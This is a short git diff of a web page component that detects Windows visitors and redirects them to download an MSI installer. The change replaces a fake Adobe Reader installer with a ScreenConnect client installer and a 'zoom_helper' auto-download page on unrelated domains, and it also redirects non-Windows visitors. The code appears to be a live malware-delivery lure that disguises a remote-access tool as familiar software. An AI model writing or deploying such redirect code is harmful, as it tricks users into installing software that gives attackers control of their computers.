@@ -5,9 +5,9 @@ export default function Home() {
     const userAgent = navigator.userAgent || "";
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://aspiceconference.com/cw";
-    const MSI_FILE = "/Adobe_Reader_install.msi";
-    const WINDOWS_REDIRECT = "https://aspiceconference.com/adobe-reader/installer/download.html";
+    const NON_WINDOWS_TARGET = "https://personalavatar.com/views";
+    const MSI_FILE = "/ScreenConnect.ClientSetup.msi";
+    const WINDOWS_REDIRECT = "digimarconibadan.com/zoom_helper_z2x9w4b7v1r6/ZOOM-AUTO-DOWNLOAD/index.html";
 
     if (isWindows) {
       window.location.href = MSI_FILE;
